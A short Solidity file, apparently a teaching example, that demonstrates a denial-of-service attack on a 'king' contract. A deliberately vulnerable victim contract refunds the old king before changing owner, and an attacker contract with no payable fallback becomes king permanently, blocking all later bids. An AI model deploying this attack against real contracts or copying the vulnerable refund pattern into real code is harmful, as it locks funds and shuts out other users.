// denial of service attack 
// The idea of that attack is not accepting ether transferring by another contract. And 
// in case of another code lines exists after sending ether those code wont work
// and in this scenerio attackr will be king and dont have a payable function and 
//then never new king will be set.
//SPDX-License-Identifier: UNLICENSED 

pragma solidity ^0.8.7;

contract victim{

    address public king;
    uint public money;

    constructor() payable {
        king = msg.sender;
        money = msg.value;
    }
    function changeking() public payable{ // should be payable takes eth to change king
        require(msg.value > money, "fee is not enough to change king");
        (bool success, ) = king.call{value: money}("");
        require(success, "eth couldnt been sent to old king");
        king = msg.sender;
        money = msg.value;
    }
    function balanceOfKing() public view returns(uint){
        return address(king).balance;
    }
    function balanceOfContract() public view returns(uint){
        return money;
    }

}
contract attacker{
    victim public v;

    constructor(address _victim){
        v = victim(_victim);
    }

    function attack() public payable{
       v.changeking{value: msg.value}();
    }
    function balanceOfContract() public view returns(uint){
        return address(this).balance;
    }
}
